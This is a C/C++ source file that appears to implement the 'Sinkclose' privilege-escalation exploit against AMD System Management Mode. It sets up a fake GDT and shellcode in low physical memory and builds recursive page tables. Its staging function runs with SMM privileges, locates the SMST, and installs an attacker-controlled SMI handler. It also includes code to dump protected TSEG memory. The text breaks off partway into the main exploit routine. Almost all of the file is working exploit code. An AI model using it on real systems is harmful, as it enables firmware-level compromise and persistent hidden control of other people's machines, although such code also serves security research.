#include "global.h"
#include "pci.h"
#include "common_chipset.h"
#include "amd_chipset.h"
#include "Util.h"
#include "physmem.h"
#include "msr.h"
#include "smi.h"
#include "smm_communicate.h"

#ifdef __linux__
#include <sched.h>
#include <unistd.h>
#endif

extern "C" void _core0_shell();

void hexdump(const char *data, size_t size, uint64_t offset);

// #define DUMP_TSEG 1
// #define SQUIRREL_DEBUG      1
#define INSTALL_FCH_SMI_HANDLER 1
// #define INSTALL_ROOT_SMI_HANDLER 1


#define SQUIRREL_BAR        0xD0800000

/// Used for calculating sizes of the assembly functions 
/// (shellcode defined in sinkclose.s)
#define FUNCTION_END_NEEDLE "\x90\x90\x90\x90IOA\x90\x90\x90\x90\x90"

/// This is the space in between the different SMM_BASE across
/// the different cores
#define SMM_BASE_DISTANCE               0x2000

/// The GDTR is FFFE-FFFFFFFF
/// Base is then 0xFFFFFFFF -> Wraps around 4G and is shifted off by 1 at 0x0000
#define GDT_SINKCLOSE_ADDRESS           0x0000

#define CORE0_SHELLCODE_ADDRESS         0x1000 // 400 bytes for initial 32bit payload (core0_shell)
#define ORIGINAL_GDTR                   0x400 // GDTR to reload
#define ORIGINAL_GDT_OFFSET             0x408 // Start of GDT to reload
#define ORIGINAL_GDT                    0x1408 

#define CORE0_PML4                      0x2000  // Physical Address



#define PG_RECURSIVE_ENTRY      0x1ED
#define PG_X64_STAGING_FUNC     0x1EE
#define PG_STACK_ENTRY          0x1EF
#define PG_AUX_DATA_ENTRY       0x1FF


#define CORENUM 64
/*
>>> print_idxs(0xfffff6fb7dbff000)
pte-i : 1ff
pde-i : 1ed
pdpt-i: 1ed
pml4-i: 1ed
*/
#define X64_STAGING_FUNC_AUX_DATA_VADDR 0xfffff6fb7dbff000

#define CORE1_SHELLCODE_ADDRESS (CORE0_SHELLCODE_ADDRESS + SMM_BASE_DISTANCE)

UINT64 PhysicalMappings[] = {
    GDT_SINKCLOSE_ADDRESS,
    CORE0_SHELLCODE_ADDRESS,
    CORE0_PML4,
    CORE1_SHELLCODE_ADDRESS,
};


#define SINKCLOSE_SMI_HANDLER_VADDR     0x1000
#define SINKCLOSE_SW_SMI_NUMBER         0x69


#pragma pack(push, 1)
struct _pxe {
  union {
    struct {
      UINT64 p: 1;
      UINT64 rw: 1;
      UINT64 us: 1;
      UINT64 pwt: 1;
      UINT64 pcd: 1;
      UINT64 a: 1;
      UINT64 d: 1;
      UINT64 ps: 1;
      UINT64 g: 1;
      UINT64 rsvd0: 3;
      UINT64 pfn: 40;
      UINT64 rsvd1: 11;
      UINT64 xd: 1;
    } parts;
    UINT64 val;
  };
};


struct _x64_staging_aux_data {
    UINT64 tseg_base;
    UINT32 tseg_size;
    // This is a buffer used to copy out TSEG
    UINT64 buffer_ptr;
    UINT32 handler_size;    
    UINT8  handler_code[];        
};

#pragma pack (pop)



#define EFIAPI

typedef
EFI_STATUS
#ifdef __linux__
__attribute__((ms_abi))
#endif
(EFIAPI *EFI_SMM_HANDLER_ENTRY_POINT)(
  EFI_HANDLE  DispatchHandle,
  void  *Context,
  void    *CommBuffer,
  UINT64   *CommBufferSize
  );

typedef
EFI_STATUS
#ifdef __linux__
__attribute__((ms_abi))
#endif
(EFIAPI *EFI_MM_INTERRUPT_REGISTER)(
  EFI_SMM_HANDLER_ENTRY_POINT    Handler,
  EFI_GUID                *HandlerType,
  EFI_HANDLE                    *DispatchHandle
  );


typedef
EFI_STATUS
#ifdef __linux__
__attribute__((ms_abi))
#endif
(EFIAPI *EFI_LOCATE_PROTOCOL)(
  EFI_GUID  *Protocol,
  void      *Registration,
  void      **Interface
  );

typedef struct {
  UINTN    SwSmiInputValue;
} EFI_SMM_SW_REGISTER_CONTEXT;

typedef
EFI_STATUS
#ifdef __linux__
__attribute__((ms_abi))
#endif
(EFIAPI *EFI_SMM_SW_REGISTER2)(
  void *This,
  EFI_SMM_HANDLER_ENTRY_POINT   DispatchFunction,
  EFI_SMM_SW_REGISTER_CONTEXT    *RegisterContext,
  EFI_HANDLE                     *DispatchHandle
  );

typedef struct _EFI_SMM_SW_DISPATCH2_PROTOCOL {
  EFI_SMM_SW_REGISTER2      Register;
  void *                    UnRegister;
  ///
  /// A read-only field that describes the maximum value that can be used in the
  /// EFI_SMM_SW_DISPATCH2_PROTOCOL.Register() service.
  ///
  UINTN                     MaximumSwiValue;
} EFI_SMM_SW_DISPATCH2_PROTOCOL;

typedef  EFI_MM_INTERRUPT_REGISTER   EFI_SMM_INTERRUPT_REGISTER;

typedef
EFI_STATUS
#ifdef __linux__
__attribute__((ms_abi))
#endif
(EFIAPI *EFI_ALLOCATE_POOL)(
  EFI_MEMORY_TYPE              PoolType,
  UINTN                        Size,
  void                         **Buffer
  );


#define SIGNATURE_16(A, B)                     ((A) | (B << 8))
#define SIGNATURE_32(A, B, C, D)               (SIGNATURE_16 (A, B) | (SIGNATURE_16 (C, D) << 16))
#define MM_MMST_SIGNATURE                      SIGNATURE_32 ('S', 'M', 'S', 'T')
#define SMST_ALLOCATE_POOL_FUNC_OFFSET         0x50
#define SMST_CPU_SAVE_STATE                    0x50 + 0x8 * 8
#define SMST_LOCATE_PROTOCOL_FUNC_OFFSET       0xD0
#define SMST_SMI_HANDLER_REGISTER_FUNC_OFFSET  0xE0



int sinkclose_smi(SW_SMI_CALL *smi_call) {
    smi_call->TriggerPort = get_smi_port();

    int status;
    #ifdef __linux__
        status = ioctl(g_hDevice, IOCTL_SINKCLOSE, smi_call);           
    #else //_WIN32        
        DWORD dwBytesReturned = 0;
        status = DeviceIoControl(
            g_hDevice, 
            IOCTL_SINKCLOSE, 
            smi_call, sizeof(*smi_call), 
            NULL, NULL, 
            &dwBytesReturned, 
            NULL
        );
    #endif    

    return status;  
}


void * allocate_page() {
    void *mem;
    #ifdef __linux__ 
        mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    #else //_WIN32        
        mem = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    #endif

    memset(mem, 0x00, PAGE_SIZE);
    return mem;
}

void free_page(void *page) {
    #ifdef __linux__ 
        munmap(page, PAGE_SIZE);
    #else //_WIN32        
        VirtualFree(page, PAGE_SIZE, MEM_RELEASE);
    #endif
}

/// @brief  This is 64-bit code executing with SMM privileges
/// Currently, it fetches the gSmst and registers a new SMI Handler
/// The SMI Handler function will point to physical address 0x1000
#ifdef _WIN32
#pragma code_seg(".x64_staging_section")
#endif
void 
#ifdef __linux__
__attribute__((section(".x64_staging_section"))) 
#endif
x64_staging_func() {        

    #ifdef SQUIRREL_DEBUG
        UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
        squirrel[32] = 0x42424242;
    #endif

    struct _x64_staging_aux_data *aux_data = 
             (struct _x64_staging_aux_data * ) X64_STAGING_FUNC_AUX_DATA_VADDR;

    UINT32 *tseg_start = (UINT32 *) aux_data->tseg_base;
    UINT32 tseg_size   = aux_data->tseg_size;
    UINT32 *tseg_end   = (UINT32 *) ((char *)tseg_start + tseg_size);


    UINT32 *ptr = tseg_start;
    // Find SMST
    while (*ptr != MM_MMST_SIGNATURE && ptr != tseg_end) {
        ptr++;
    }

    #ifdef SQUIRREL_DEBUG
        squirrel[34] = *ptr;    
    #endif
    
    EFI_STATUS Status;

    #ifdef SQUIRREL_DEBUG
        squirrel[35] = 0x41414141;          
    #endif

    #ifdef INSTALL_FCH_SMI_HANDLER

        EFI_LOCATE_PROTOCOL SmmLocateProtocol = (EFI_LOCATE_PROTOCOL) 
                            *(UINT64 *)((char *)ptr + SMST_LOCATE_PROTOCOL_FUNC_OFFSET);

        EFI_SMM_SW_DISPATCH2_PROTOCOL  *SwDispatch;
        EFI_SMM_SW_REGISTER_CONTEXT    SwContext;
        EFI_HANDLE                     SwHandle = 0;

        #ifdef SQUIRREL_DEBUG
            squirrel[35] = 0x43434343;  
            *(UINT64 *)&squirrel[36] = (UINT64) SmmLocateProtocol;  
        #endif

        
        // Allocate pool of memory for the handler

        void *smi_handler_dst_location = NULL;

        EFI_ALLOCATE_POOL SmmAllocatePool = (EFI_ALLOCATE_POOL) 
                            *(UINT64 *)((char *)ptr + SMST_ALLOCATE_POOL_FUNC_OFFSET);

         Status = SmmAllocatePool (
            RuntimeCode, 
            aux_data->handler_size, 
            (void **)&smi_handler_dst_location
        );

        #ifdef SQUIRREL_DEBUG
            *(UINT64 *)&squirrel[38] = (UINT64) smi_handler_dst_location;  
        #endif

        // Memcpy        
        UINT32 *dst_ptr = (UINT32 *) smi_handler_dst_location;    
        UINT32 *src_ptr = (UINT32 *) aux_data->handler_code;
        for ( int i = 0; i < (aux_data->handler_size >> 2); i++) {
            dst_ptr[i] = src_ptr[i];
        }

        // Register FCH SMI Handler

        EFI_GUID  gEfiSmmSwDispatch2ProtocolGuid = {            
            0x18a3c6dc, 0x5eea, 0x48c8, {0xa1, 0xc1, 0xb5, 0x33, 0x89, 0xf9, 0x89, 0x99}
        };

        Status = SmmLocateProtocol(
            &gEfiSmmSwDispatch2ProtocolGuid,
            NULL, 
            (void **)&SwDispatch
        );

        #ifdef SQUIRREL_DEBUG 
            squirrel[40] = Status;    
            *(UINT64 *)&squirrel[42] = (UINT64 ) SwDispatch;    
        #endif

        SwContext.SwSmiInputValue = SINKCLOSE_SW_SMI_NUMBER;

        Status = SwDispatch->Register(
            SwDispatch,  
            (EFI_SMM_HANDLER_ENTRY_POINT ) smi_handler_dst_location, 
            &SwContext, 
            &SwHandle
        );

    #elif INSTALL_ROOT_SMI_HANDLER

        EFI_SMM_INTERRUPT_REGISTER SmiHandlerRegister = (EFI_SMM_INTERRUPT_REGISTER) 
                            *(UINT64 *)((char *)ptr + SMST_SMI_HANDLER_REGISTER_FUNC_OFFSET);

        EFI_GUID  gSinkcloseGuid = {            
            0x11111111, 0x1111, 0x1111, {0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11}
        };

        EFI_HANDLE  DispatchHandle;

        SmiHandlerRegister(
            (EFI_SMM_HANDLER_ENTRY_POINT) SINKCLOSE_SMI_HANDLER_VADDR,
            &gSinkcloseGuid,
            &DispatchHandle
        );
    #endif


    #ifdef DUMP_TSEG
        UINT32 *dst_ptr = (UINT32 *) aux_data->buffer_ptr;    
        UINT32 *src_ptr = tseg_start;
        for ( int i = 0; i < (tseg_size >> 2); i++) {
            dst_ptr[i] = src_ptr[i];
        }
    #endif


    #ifdef SQUIRREL_DEBUG        
        squirrel[48] = 0x45454545;    
    #endif

    return;
}

#ifdef _WIN32
#pragma code_seg()
#endif

void 
#ifdef __linux__
__attribute__((section(".marker_section1"))) 
#endif
marker_section1() {};



/// @brief  Gets the size of the x64_staging function 
///         by calculating the distance between sections
/// @return 
UINT32 get_x64_staging_size() {
    UINT32 section_size = 0;
    #ifdef __linux__
    section_size = ((UINT64)marker_section1 - (UINT64)x64_staging_func);
    #else 
    section_size = PAGE_SIZE; 
    #endif    
    return section_size;
}


/*
    0000: 00 00 00 00 00 00 00 00 ff ff 00 00 00 9b cf 00
    0010: ff ff 00 00 00 9b af 00 ff ff 00 00 00 93 cf 00
    0020: ff ff 00 00 00 fb cf 00 ff ff 00 00 00 f3 cf 00
    0030: ff ff 00 00 00 fb af 00 00 00 00 00 00 00 00 00
    0040: 87 40 00 40 1a 8b 00 26 2e fe ff ff 00 00 00 00
    0050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0070: 00 00 00 00 00 00 00 00 04 00 00 00 00 f5 40 00
*/

// X86 segment descriptor (32-bit)
struct SegmentDescriptor {
    uint16_t limit_low;          // Lower 16 bits of the segment limit
    uint16_t base_low;           // Lower 16 bits of the base address
    uint8_t  base_middle;        // Next 8 bits of the base address

    // Access byte
    uint8_t accessed : 1;        // Segment accessed flag
    uint8_t readable_or_writable : 1; // Readable (code seg) / Writable (data seg)
    uint8_t conforming_or_expand_down : 1; // Conforming (code) / Expand-down (data)
    uint8_t executable : 1;      // Executable segment flag (code or data)
    uint8_t descriptor_type : 1; // Descriptor type (1 = code/data, 0 = system)
    uint8_t dpl : 2;             // Descriptor Privilege Level (0-3)
    uint8_t present : 1;         // Segment present in memory

    // Granularity byte
    uint8_t limit_high : 4;      // Upper 4 bits of the segment limit
    uint8_t available : 1;       // Available for OS use (AVL)
    uint8_t long_mode : 1;       // Long mode (64-bit code, 0 for 32-bit segments)
    uint8_t default_op_size : 1; // Default operation size (0 = 16-bit, 1 = 32-bit)
    uint8_t granularity : 1;     // Granularity (0 = byte, 1 = 4 KB)

    uint8_t base_high;           // Last 8 bits of the base address
} __attribute__((packed));

unsigned char FAKE_GDT[] = {
    // NULL Descriptor
    /*0x00*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Code Segment - 32 Bit - DPL0
    /*0x08*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x9b, 0xcf, 0x00,
    // Code Segment - 32 Bit - DPL0
    /*0x10*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x9b, 0xcf, 0x00,
    // Data Segment - 32 Bit
    /*0x18*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x93, 0xcf, 0x00,
    // Data Segment - 32 Bit
    /*0x20*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x93, 0xcf, 0x00,
    // Code Segment - 16 bit
    /*0x28*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x9b, 0x8f, 0x00,
    // Data Segment - 16 bit
    /*0x30*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x93, 0x8f, 0x00,
    // Code Segment - 64 bit
    /*0x38*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x9b, 0xaf, 0x00,
    // TSS Segment
    /*0x40*/ 0x68, 0x00, 0x08, 0x31, 0xd0, 0x8b, 0x80, 0xae,
    // Data Segment - 64 bit
    /*0x48*/ 0xff, 0xff, 0x00, 0x00, 0x00, 0x92, 0xaf, 0x00,
    /*0x50*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void updateGDTBase(unsigned char* gdt, int entryIndex, unsigned int newBase) {
    // Calculate the starting index of the entry in the GDT
    int entryStartIndex = entryIndex * 8;

    // Update the base address bytes in the entry
    gdt[entryStartIndex + 2] = (newBase >> 0) & 0xFF;
    gdt[entryStartIndex + 3] = (newBase >> 8) & 0xFF;
    gdt[entryStartIndex + 4] = (newBase >> 16) & 0xFF;
    gdt[entryStartIndex + 7] = (newBase >> 24) & 0xFF;
}


void patch_shellcode_ptr(char* shellcode, UINT32 base_offset, UINT32 val)
{
    *((UINT32*)&shellcode[base_offset + 6])  = val;
    *((UINT32*)&shellcode[base_offset + 18]) = val + 4;
}


/// @brief  Copies the shellcode at CORE0_SHELLCODE_ADDRESS
void prepare_shellcode_core_main(UINT32 smi_entry_point) {

    // Get pointer to the needle and calculate function size
    void *ptr = memmem(
        (void *) &_core0_shell, 
        PAGE_SIZE, 
        FUNCTION_END_NEEDLE, 
        sizeof(FUNCTION_END_NEEDLE) - 1
    );

    UINT32 sh_len = (UINT64)ptr -  (UINT64)_core0_shell;    
    printf("core0_shell is %d bytes long\n", sh_len);

    char* shellcode_page = (char *)map_physical_memory(CORE0_SHELLCODE_ADDRESS, PAGE_SIZE);
    
    printf("copying core0_shell to physical address %08x\n", CORE0_SHELLCODE_ADDRESS);
    
    // Copy 32bit Core0_shell
    memcpy(shellcode_page, (void *) _core0_shell, sh_len);

    hexdump(shellcode_page, sh_len, 0);

    // Write to the mapped region

    // Create a copy of the GDT at offset ORIGINAL_GDT_OFFSET 
    // This is used by core0_shell to reload the gdt and have clean flat descriptors
    // It needs to be placed in physical address 0x1000 because our paging layout
    memcpy(
        (char*)shellcode_page + ORIGINAL_GDT_OFFSET, 
        (char*)FAKE_GDT, 
        sizeof(FAKE_GDT)
    );

    // Setup GDTR
    *(UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) = sizeof(FAKE_GDT) - 1;
    *(UINT32 *)((UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) + 1) = ORIGINAL_GDT;
    
    //hexdump(shellcode_page, 0x1000, CORE0_SHELLCODE_ADDRESS);

    unmap_physical_memory(shellcode_page, PAGE_SIZE);
}


struct x_mapping {
    UINT32 size;

    UINT32 aligned_size;
    UINT64 vaddr;        
    UINT32 num_pages;
    void **pages;
    UINT32 num_tables;
    void  **tables;
};


/// @brief  Creates a large buffer mapping (16 MBs) into the paging tables
///         This permits leaking TSEG content and passing more data if needed
///      The VADDRs for this are
                //  1ED,0,4,0   ->
                //  1ED,0,4,1   ->
#define DMA_BUFFER_MAPPED_ADDR 0xfffff68000800000
UINT64 create_large_buffer(struct alloc_user_physmem *pdpt_page, struct x_mapping **mapping) {
    
    struct _pxe *pxe;

    *mapping = (struct x_mapping *) calloc(1, sizeof(struct x_mapping));

    (*mapping)->size = 16 * 1024 * 1024;
    (*mapping)->aligned_size  = ALIGN((*mapping)->size, PAGE_SIZE);
    (*mapping)->num_pages     = (*mapping)->aligned_size / PAGE_SIZE;
    (*mapping)->num_tables    = (*mapping)->num_pages / 512; // 512 entries per page

    // allocate buffer of pages
    void *pages = calloc(1, (*mapping)->num_pages * sizeof(void **));
    for (int i = 0; i < (*mapping)->num_pages; i++) {
        void *page = allocate_page();
        //printf("Allocated page %d: %016llx\n", i, page);
        *(UINT32 *)page = 0x45454545;

        ((void **)pages)[i] = page;
    }
    // [ page, page2 .. page 4096]
    (*mapping)->pages = (void **)pages;


    // Allocate buffer of tables
    void *tables = calloc(1, (*mapping)->num_tables * sizeof(void **));
    for (int i = 0; i < (*mapping)->num_tables; i++) {
        void *table = allocate_page();
        //printf("Allocated table %d: %016llx\n", i, table);
        ((void **)tables)[i] = table;
    }

    (*mapping)->tables = (void **)tables;


    // Fill in the information of pages in our tables
    int k = 0; // index on tables

    pxe = (struct _pxe *) ((void **)tables)[k];
    for (int i = 0; i < (*mapping)->num_pages; i++) {
        // grab the page
        void *page = ((void **)pages)[i];

        // get the physical address of the page
        UINT64 page_pa = virt_to_phys((UINT64) page);

        // printf("Page-%d %016llx -> physaddr: %016llx (table %d)\n",
        //      i, page, page_pa, k);
        
        // Fill the information in the table entry

        // set present
        pxe->parts.p    = 1;
        // set RW
        pxe->parts.rw   = 1;
        // set U/S
        pxe->parts.us   = 1;
        // set A
        pxe->parts.a    = 1;
        // set D
        pxe->parts.d    = 1;
        //
        pxe->parts.pfn  = PFN(page_pa);

        // next entry
        pxe++;

        if ( ((i+1) % 512) == 0) {
            k++;
            pxe = (struct _pxe *) ((void **)tables)[k];
        }
    }


    pxe = (struct _pxe *) ((UINT64 *) pdpt_page->va + 4);

    // 8 entries to map each of the tables above
    for (int i = 0; i < (*mapping)->num_tables; i++) {
        void *table = ((void **)tables)[i];

        UINT64 table_pa = virt_to_phys((UINT64) table);

        // printf("Table %016llx -> physaddr: %016llx\n", table, table_pa);

        // set present
        pxe->parts.p    = 1;
        // set RW
        pxe->parts.rw   = 1;
        // set U/S
        pxe->parts.us   = 1;
        // set A
        pxe->parts.a    = 1;
        // set D
        pxe->parts.d    = 1;
        //
        pxe->parts.pfn  = PFN(table_pa);

        pxe++;
    }

    return DMA_BUFFER_MAPPED_ADDR;
}


void destroy_mapping(struct x_mapping **mapping) {

    void **pages = (void **) (*mapping)->pages;
    for (int i = 0; i < (*mapping)->num_pages; i++) {       
        void *page = ((void **)pages)[i];
        free_page(page);
    }

    //printf("free the pages buffer\n");
    free((*mapping)->pages);

    void **tables = (void **) (*mapping)->tables;
    for (int i = 0; i < (*mapping)->num_tables; i++) {
        //printf("free mapping tables %d\n", i);
        void *table = ((void **)tables)[i];
        free_page(table);
    }
    
    //printf("free the tables buffer\n");
    free((*mapping)->tables);

    // free the structure itself
    //printf("free the mapping\n");
    free(*mapping);

    *mapping = NULL;
}

/// @brief  sets up a recursive paging structure at CORE0_PML4
void prepare_paging(
    struct alloc_user_physmem *pdpt_page, 
    UINT64 x64_staging_func_pa, 
    UINT64 stack_pa, 
    UINT64 aux_buff_pa) 
{


    void *pml4 = map_physical_memory(CORE0_PML4, PAGE_SIZE);
    memset(pml4, 0x00, PAGE_SIZE);

    struct _pxe *pxe;
    
    // Map the recursive entry at 0x1ED (memories)
    pxe = (struct _pxe *) ((UINT64 *)pml4 + PG_RECURSIVE_ENTRY);
    
    // set present
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    //
    pxe->parts.pfn  = PFN(CORE0_PML4);
    

    pxe++; // Put the x64_staging function at 0x1EE
    
    // VADDR then is: 0xfffff6fb7dbee000
    // set present
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    //
    pxe->parts.pfn  = PFN(x64_staging_func_pa);
    

    pxe++;

    // (Entry-1EF) Stack for x64_staging
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // Maps the stack to be used later
    pxe->parts.pfn  = PFN(stack_pa);




    // Maps a portion of the first 512Gigs
    pxe = (struct _pxe *) pml4;

    // (Entry-0)
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // Maps the PDPT located at CORE0_PDPT
    pxe->parts.pfn  = PFN(pdpt_page->pa);

    


    pxe = (struct _pxe *) ((UINT64 *) pml4 + PG_AUX_DATA_ENTRY); 

    // (Entry-511) AUX Data for x64_staging
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
   
    pxe->parts.pfn  = PFN(aux_buff_pa);


    unmap_physical_memory(pml4, PAGE_SIZE);

    /*
     0      -> PDPT
     
     ..
     1ED    -> Recursive entry 
     1EE    -> x64_staging_func (through the recursive entry)
     1EF      -> Stack (4096) (through the recursive entry)
                0xfffff6fb7dbef000

     1FF    -> Last entry is used for aux data passed to the staging func
                0xfffff6fb7dbff000
     ..
    */

/*     struct alloc_user_physmem l2_page = {0};
    if (alloc_user_mem(PAGE_SIZE, &l2_page) == FALSE) {
        printf("failed to allocate page for l2_page\n");
        exit(-1);
    }
    memset((void *) l2_page.va, 0x00, PAGE_SIZE); */

    // Reserver a page for the PDPT
    memset((void *) pdpt_page->va, 0x00, PAGE_SIZE);

    // Map LARGE 1G Entries to cover 4Gigs (indentity mapped)
    pxe = (struct _pxe *) pdpt_page->va;

    // (Entry-0)
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // LARGE PAGE (1Gig)
    pxe->parts.ps   = 1;
    // Maps 0x00000000 - 0x40000000
    pxe->parts.pfn  = PFN(0);

    pxe++;

    // (Entry-1)
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // LARGE PAGE (1Gig)
    pxe->parts.ps   = 1;
    // Maps 0x40000000 - 0x80000000
    pxe->parts.pfn  = PFN(0x40000000);

    pxe++;

    // (Entry-2)
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // LARGE PAGE (1Gig)
    pxe->parts.ps   = 1; 
    // Maps 0x80000000 - 0xC0000000
    pxe->parts.pfn  = PFN(0x80000000);

    pxe++;

    // (Entry-3)
    pxe->parts.p    = 1;
    // set RW
    pxe->parts.rw   = 1;
    // set U/S
    pxe->parts.us   = 1;
    // set A
    pxe->parts.a    = 1;
    // set D
    pxe->parts.d    = 1;
    // LARGE PAGE (1Gig)
    pxe->parts.ps   = 1; 
    // Maps 0xC0000000 - 0xFFFFFFFF
    pxe->parts.pfn  = PFN(0xC0000000);
}


void dump_mapping(struct x_mapping *mapping) {
    FILE *fp = fopen("tseg_dumpx.bin", "wb");
    void **pages = (void **) mapping->pages;
    for (int i = 0; i < mapping->num_pages; i++) {       
        void *page = ((void **)pages)[i];
        fwrite(page, PAGE_SIZE, 1, fp);
    }

    fclose(fp);
}



#ifdef _WIN32
#pragma code_seg(".smi_handler")
#endif
#ifdef __linux__
__attribute__((ms_abi))
#endif
void 
#ifdef __linux__
__attribute__((section(".smi_handler"))) 
#endif
smi_handler(
    EFI_HANDLE DispatchHandle,
    void       *DispatchContext,
    void       *SwContext,
    UINT32     *SizeOfSwContext 
    ) 
{    
    #ifdef SQUIRREL_DEBUG
        UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
        squirrel[0] = 0xAAAAAAAA;
    #endif
    
    // offset for rip in save state area
    //uint32_t *ptr = (uint32_t *)(0xafe3d000 + 0xFF78);
    // offset for SVM Guest State Area
    uint32_t *ptr = (uint32_t *)(0xafe3d000 + 0xFED8);
    uint32_t value = *ptr;
    //uint32_t value = 0xCAFEBABE;
    
    __asm__ volatile (
        "wrmsr"
        :
        : "c"(0xC0011001), "a"(value)
        : "memory"
    );
    /* This crashes the SMM .... probably 0x000 not mapped? */
    //UINT32 *MEMSTART = (UINT32 *)0x0000;
    //MEMSTART[0] = 0xCAFEBABE;
    return;
}

/* smi_handler_save_state_copy (
    EFI_HANDLE  DispatchHandle,
    void  *DispatchContext,
    void        *SwContext,
    UIN32   *SizeOfSwContext
    )
{
    EFI_SMM_CPU_PROTOCOL *SmmCpu;
    EFI_STATUS Status;
    UINTN ProcessorIndex;
    VOID *SaveState;
    UINTN SaveStateSize;

    EFI_GUID gEfiSmmCpuProtocolGuid = {
        0xeb346b97, 
        0x975f, 
        0x4a9f, 
        {0x8b, 0x22, 0xf8, 0xe9, 0x2b, 0xb3, 0xd5, 0x69},
    };

    EFI_LOCATE_PROTOCOL SmmLocateProtocol = (EFI_LOCATE_PROTOCOL) 
                            *(UINT64 *)((char *)SaveState + SMST_LOCATE_PROTOCOL_FUNC_OFFSET);
    
    void*  save_state = (void *)gMmst->CpuSaveState[0];
    return EFI_SUCCESS;
} */

#ifdef _WIN32
#pragma code_seg()
#endif

void 
#ifdef __linux__
__attribute__((section(".marker_section2"))) 
#endif
marker_section2() {};


/// @brief  Gets the size of the smi_handler function 
///         by calculating the distance between sections
/// @return 
UINT32 get_smi_handler_size() {
    UINT32 section_size = 0;    
    #ifdef __linux__    
        section_size = ((UINT64)marker_section2 - (UINT64)smi_handler);    
    #else
        section_size = PAGE_SIZE;
    #endif   
    return section_size;
}

// Function to print a hexdump of a char array
void hexdump(const char *data, size_t size, uint64_t offset) {
    const size_t bytes_per_line = 16; // Number of bytes to display per line
    for (size_t i = 0; i < size; i += bytes_per_line) {
        if (offset != 0)
            printf("%016zx;  ", i+offset); // Print the offset

        // Print the hex values for this line
        for (size_t j = 0; j < bytes_per_line; j++) {
            if (i + j < size) {
                printf("%02x ", (unsigned char)data[i + j]);
            } else {
                printf("   "); // Pad with spaces if we are at the end
            }
        }
        printf("\n");
    }
}

static void print_desc(struct SegmentDescriptor *sec_desc) {
    printf("SegDescHex 0x%016lx\n", ((UINT64 *)sec_desc));
    printf("Segment Descriptor Fields:\n");
    printf("--------------------------\n");
    printf("Base Address     : 0x%08X\n", sec_desc->base_low);
    printf("Segment Limit : 0x%05X\n", sec_desc->limit_high << 16 | sec_desc->limit_low);
    printf("Access Byte:\n");
    printf("  Accessed       : %d\n", sec_desc->accessed);
    printf("  Read/Writable  : %d\n", sec_desc->readable_or_writable);
    printf("  Conforming/Exp : %d\n", sec_desc->conforming_or_expand_down);
    printf("  Executable     : %d\n", sec_desc->executable);
    printf("  Descriptor Type: %d\n", sec_desc->descriptor_type);
    printf("  DPL            : %d\n", sec_desc->dpl);
    printf("  Present        : %d\n", sec_desc->present);
    printf("Granularity Byte:\n");
    printf("  Limit High     : 0x%01X\n", sec_desc->limit_high);
    printf("  AVL            : %d\n", sec_desc->available);
    printf("  Long Mode      : %d\n", sec_desc->long_mode);
    printf("  Default Size   : %d\n", sec_desc->default_op_size);
    printf("  Granularity    : %d\n", sec_desc->granularity);
    printf("--------------------------\n");
}

extern void amd_print_smm_tseg_addr_for_core(int core);

/*
 * main core **MUST** be different from 0
 * otherwise SMI will be broadcast and exploit will fail
*/
void sinkclose_exploit()
{
    BOOL res;

    // Get SMM base location
    UINT64 smm_base_core_main = 0;
    do_read_msr_for_core(1, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core_main);
    printf("SMM Base for Core1: %016llx\n", smm_base_core_main);

    UINT32 smm_entry_point_core_main = smm_base_core_main + AMD_SMI_HANDLER_ENTRY_POINT;

    // Set the fake GDT for core 0 and core 1
    // 0xaef4b053 = smm_entry_point_core_main + 0x53
    UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core_main + 0x53) + CORE0_SHELLCODE_ADDRESS;
    printf("GDT cs_base: 0x%08x\n", gdt_cs_base);
    printf("GDT cs_base + jump offset (overflow 32 bit): 0x%08lx\n", gdt_cs_base + (smm_entry_point_core_main + 0x53));

    void* gdt_physpage = map_physical_memory(0x00000000, PAGE_SIZE);

